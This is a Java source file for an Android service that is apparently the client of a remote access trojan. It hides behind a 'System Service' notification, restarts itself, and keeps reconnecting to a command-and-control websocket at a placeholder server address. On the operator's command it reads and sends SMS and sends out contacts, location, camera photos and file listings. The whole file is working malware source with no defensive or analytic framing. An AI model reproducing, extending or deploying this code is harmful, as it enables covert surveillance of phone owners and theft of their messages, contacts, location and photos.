package com.wahala.client;

import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;

public class ServiceCore extends Service {
    private Network network;
    private static final String C2_URL = "ws://YOUR_SERVER_IP:4444"; // Builder patches this
    private static final String AES_KEY = "YOUR_BASE64_KEY"; // Builder patches this

    @Override
    public void onCreate() {
        super.onCreate();
        Crypto.init(AES_KEY);
        network = new Network(this);
        startForegroundService();
        network.connect(C2_URL);
    }

    private void startForegroundService() {
        String channelId = "wahala_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1, notification);
    }

    public void handleCommand(String jsonCmd) {
        try {
            JSONObject obj = new JSONObject(jsonCmd);
            String module = obj.getString("module");
            String action = obj.getString("action");
            String payload = obj.optString("payload", "");

            switch (module) {
                case "SYSINFO":
                    network.send("{\"hostname\":\"" + Build.MODEL + "\",\"os\":\"Android " + Build.VERSION.RELEASE + "\"}");
                    break;
                case "SMS":
                    if (action.equals("READ")) network.send(SmsHelper.readSms(this));
                    else if (action.equals("SEND")) SmsHelper.sendSms(this, payload);
                    break;
                case "CONTACTS":
                    network.send(ContactHelper.getContacts(this));
                    break;
                case "LOCATION":
                    LocationHelper.getLocation(this, network);
                    break;
                case "CAMERA":
                    CameraHelper.takePhoto(this, action, network);
                    break;
                case "FILES":
                    if (action.equals("LIST")) network.send(FileHelper.listDir(payload));
                    break;
            }
        } catch (Exception e) {
            // Ignore malformed commands
        }
    }

    public void reconnect() {
        try { Thread.sleep(5000); } catch (Exception ignored) {}
        network.connect(C2_URL);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        if (network != null) network.close();
        super.onDestroy();
    }
}
